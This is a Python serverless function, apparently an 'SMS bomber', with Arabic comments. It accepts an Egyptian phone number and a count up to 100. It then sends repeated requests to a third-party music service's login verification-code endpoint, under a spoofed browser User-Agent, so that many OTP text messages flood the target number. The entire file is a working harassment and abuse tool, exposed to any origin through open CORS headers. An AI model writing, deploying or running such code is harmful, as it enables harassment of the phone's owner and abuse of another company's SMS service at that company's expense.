# api/send.py

import json
import requests
import time

def handler(request):
    # إعداد رؤوس CORS للسماح بالاتصال من أي مصدر
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json; charset=utf-8'
    }

    # إذا كان الطلب من نوع OPTIONS (لـ CORS)
    if request.method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': headers,
            'body': ''
        }

    # التحقق من أن طريقة الطلب هي POST
    if request.method != 'POST':
        return {
            'statusCode': 405,
            'headers': headers,
            'body': json.dumps({'message': 'طريقة الطلب غير مسموحة'})
        }

    try:
        # قراءة البيانات المرسلة
        data = json.loads(request.body)
        number = data.get('number')
        sms_count = data.get('sms_count', 1)
    except Exception as e:
        return {
            'statusCode': 400,
            'headers': headers,
            'body': json.dumps({'message': f'خطأ في قراءة البيانات: {str(e)}'}, ensure_ascii=False)
        }

    # التحقق من صحة رقم الهاتف
    if not (number and number.startswith("01") and len(number) == 11):
        return {
            'statusCode': 400,
            'headers': headers,
            'body': json.dumps({'message': 'بيانات غير صحيحة، تأكد من رقم الهاتف'}, ensure_ascii=False)
        }

    # تنفيذ إرسال الرسائل
    success_count, failure_count = send_sms_requests(number, sms_count)

    # إرسال الرد
    response_message = f"تمت العملية: {success_count} رسالة ناجحة و {failure_count} فاشلة."
    return {
        'statusCode': 200,
        'headers': headers,
        'body': json.dumps({'message': response_message}, ensure_ascii=False)
    }

def send_sms_requests(number, sms_count):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    phone_number = "2" + number
    success = 0
    failure = 0
    count = min(int(sms_count), 100)
    for _ in range(count):
        payload = json.dumps({"dial": phone_number})
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json",
        }
        try:
            response = requests.post(url, headers=headers, data=payload, timeout=10)
            if response.status_code == 200:
                success += 1
            else:
                failure += 1
        except Exception:
            failure += 1
        time.sleep(1)
    return success, failure
